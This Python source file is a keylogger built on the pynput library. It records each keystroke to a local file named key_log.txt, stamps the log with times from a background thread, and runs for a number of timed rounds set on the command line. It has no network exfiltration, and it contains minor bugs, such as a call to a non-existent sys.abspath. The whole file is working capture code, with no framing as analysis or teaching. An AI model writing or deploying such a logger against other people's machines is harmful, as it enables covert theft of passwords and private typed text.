import os,sys
import threading
from pynput.keyboard import Key,Listener
from datetime import datetime
import time
keys_information="key_log.txt"
def resource_path(relative_path):
    try:
        base_path=sys.abspath(".")
    except Exception:
        base_path=os.path.abspath(".")
    return os.path.join(base_path,relative_path)
def keylogger():
    print("Keylogger function executed")
    time_iteration = 60 #10sec
    number_of_iterations_end = int(sys.argv[1])
    number_of_iterations = 0
    currentTime = time.time()
    stoppingTime = time.time() + time_iteration

    def write_timestamp():
        while True:
            time.sleep(5)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(resource_path(keys_information), "a") as f:
                f.write(f'\n[{timestamp}] Timestamp\n')

    threading.Thread(target=write_timestamp, daemon=True).start()
    while number_of_iterations < number_of_iterations_end:
        count=0
        keys=[]
        def on_press(key):
            nonlocal keys, count, currentTime
            print(key)
            keys.append(key)
            count += 1
            currentTime = time.time()
            if count >= 1:
                count = 0
                write_file(keys)
                keys =[]
        def write_file(keys):
            with open(resource_path(keys_information),"a")as f:
                for key in keys:
                    k=str(key).replace("'","")
                    if k.find("space")>0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key")==-1:
                        f.write(f'{k}')
                        f.close()
        def on_release(key):
            if key == Key.esc:
                return False
            if currentTime > stoppingTime:
                return False
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        if currentTime > stoppingTime:
            with open(keys_information, "a") as f:
                f.write(" ")
            number_of_iterations += 1
            currentTime = time.time()
            stoppingTime = time.time() + time_iteration

    
    print("Keylogger function STOPPED")


keylogger()